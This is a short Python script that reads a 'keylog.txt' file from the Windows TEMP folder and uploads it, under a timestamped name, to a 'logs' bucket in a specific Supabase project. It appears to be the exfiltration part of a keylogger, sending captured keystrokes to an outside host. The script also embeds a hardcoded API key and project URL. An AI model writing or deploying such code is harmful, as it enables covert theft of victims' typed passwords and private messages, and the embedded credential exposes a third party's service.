from supabase import create_client
import time
import os

key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImZsd2t0cHlvdnN1d3Ric25qcmR1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE2Nzc1OTYxODgsImV4cCI6MTk5MzE3MjE4OH0.R0UBb_4OZHTDCDbX4l79_-MYB3S9V3fICkI2rKgJGSQ"
url = "https://flwktpyovsuwtbsnjrdu.supabase.co"

supabase = create_client(url,key)

log_file = os.path.join(os.environ.get('TEMP'),"keylog.txt")

unix_time = int(time.time())
path_on_cloud = f"{unix_time}.txt"
supabase.storage().from_("logs").upload(path_on_cloud,log_file)